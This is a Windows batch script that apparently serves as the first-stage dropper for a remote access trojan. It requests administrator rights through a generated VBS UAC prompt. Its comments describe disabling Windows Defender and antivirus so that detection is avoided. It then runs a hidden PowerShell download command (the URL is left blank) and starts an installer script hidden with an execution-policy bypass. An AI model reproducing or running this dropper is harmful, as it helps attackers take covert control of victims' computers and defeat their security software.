@REM geting admin permissions for script (A prompt will occur from windows side, asking if we want to allow to run the program as an administrator)
@REM @echo off
:: BatchGotAdmin
:-------------------------------------
REM  --> check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> if error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"


@REM Now After getting the admin privillages we would like to be kinda
@REM dictator of the machine, for this we need to run "ep bypass(executionpolicy bypass)"
@REM which can be a red flag for AVs so we will try to disable them first before running
@REM 'ep bypass' so that they dont mess around and flag/false-flag anything
    @REM => We are disabling Window Defender and AV in 'Installer.ps1'

@REM RATy resources
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest-URI '' -OutFile '' "
powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1" & @REM Execution Policy Bypass


